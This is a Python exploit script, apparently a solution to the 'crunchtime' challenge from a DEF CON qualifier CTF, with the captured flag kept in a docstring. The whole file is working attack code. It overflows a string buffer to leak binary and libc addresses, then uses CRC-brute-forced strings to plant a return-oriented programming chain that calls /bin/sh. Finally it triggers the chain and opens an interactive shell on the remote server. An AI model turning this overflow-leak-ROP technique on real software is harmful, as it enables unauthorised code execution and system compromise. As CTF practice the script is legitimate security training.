from pwnlib import *

LOCAL = False

"""
cat flag
The flag is: CRCs are so much fun, but understanding that direction flag bit
is helpful

"""


### load cache

cache = {}
for line in open("cache"):
	crc, value = line.split(":")
	value = int(value)
	crc = int(crc)
	value = pd(value)
	cache[crc] = value

def c():
	return s.ru("Exit\n")

def add_string(string):
	s.send("1\n")
	s.ru("New string: ")
	s.send("%s\n" % string)
	c()

def get_string_for_4(target):
	try:	
		return cache[target]
	except KeyError:
		pass
	
	print "bruting", hex(target)
	
	cmd = "/home/imm/tmp/zzz/test %d" % target
	result = os.popen(cmd).read().strip().decode("hex")
	line = "%d:%d" % (target, ud(result))
	print "added", line
	open("cache", "a").write(line + "\n")

	cache[target] = result

	return result

def make_strings_for_payload(payload, reverse=True):
	r = []
	b = blocks(payload, 4)
	if reverse:
		b = b[::-1]
	for block in b:
		value = ud(block)
		string = get_string_for_4(value)
		r.append(string)
	return r

def emplace_payload(payload, reverse=True):
	strings = make_strings_for_payload(payload, reverse=True)
	for string in strings:
		add_string(string)


if LOCAL:
	s = Socket(("localhost", 2323))
else:
	s = Socket(("crunchtime_4314b6ee5b38b10ec376d288b84d094c.quals.shallweplayaga.me", 10100))

print c()

p = "A"*0x218 + "\x10"*8

s.send("1\n")
s.ru("New string: ")
s.send(p)
c()

s.send("2\n")
s.ru("Which string number do you want?\n")
s.send("0\n")
s.ru(p)

leaked = s.ru("\nSelect an option:")
leaked = leaked.ljust(8, chr(0))
bin_base = uq(leaked) - 0xb9d
libc_base = bin_base - 0x5ea000


print "bin: 0x%x" % bin_base

payload = pq(libc_base + 0x6d0ac) 

emplace_payload(payload)

def fix(x):
	return ((x << 32) | (x >> 32)) & 0xffffffffffffffff
payload  = ""
payload += pq(fix(libc_base + 0x46640))
payload += pq(fix(libc_base + 1559771))
payload += pq(fix(libc_base + 0x0000000000022b1a))
payload += pq(fix(0x246))
payload += pq(fix(bin_base + 0xb59))
payload += pq(fix(0x4111111111111114))
payload += "AAAA"
#payload += pq(libc_base + 0x0000000000022b1a) # pop rdi
#payload += pq(libc_base + 1559771) # bin sh
#payload += pq(bin_base + 0xb59)
#payload += pq(0x246)
#payload += pq(libc_base + 0x46640)

emplace_payload(payload, reverse=False)
s.send("3\n")
c()

print "reversing direction"

payload  = "A"*0x210
payload += "B"*8
payload += pq(0x446)

s.send("1\n")
s.ru("New string: ")
s.send(payload)


print "triggering"
s.send("3\n")





print "interacting"
s.interact()


exit()
################################


print "interacting"
s.interact()
